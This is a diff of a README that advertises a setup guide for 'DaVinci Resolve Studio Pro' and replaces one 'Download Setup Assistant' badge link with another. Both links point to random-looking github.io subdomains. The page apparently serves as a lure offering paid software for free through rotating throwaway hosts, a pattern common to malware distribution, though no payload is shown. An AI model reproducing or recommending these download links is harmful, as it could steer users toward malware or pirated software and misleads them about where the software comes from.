@@ -3,7 +3,7 @@
 Deploy **DaVinci Resolve Studio Pro** on your PC with this detailed setup guide. Access the complete professional editing suite: advanced color grading, Fusion VFX, Fairlight audio, and high-end export settings.
 
 ⬇️ **Download**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-darkgreen?style=for-the-badge&logo=resolve&logoColor=white)](https://polregter67pcinfoplus0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-darkgreen?style=for-the-badge&logo=resolve&logoColor=white)](https://davincistudioforpc12web09.github.io/.github/)
 
 ---
 
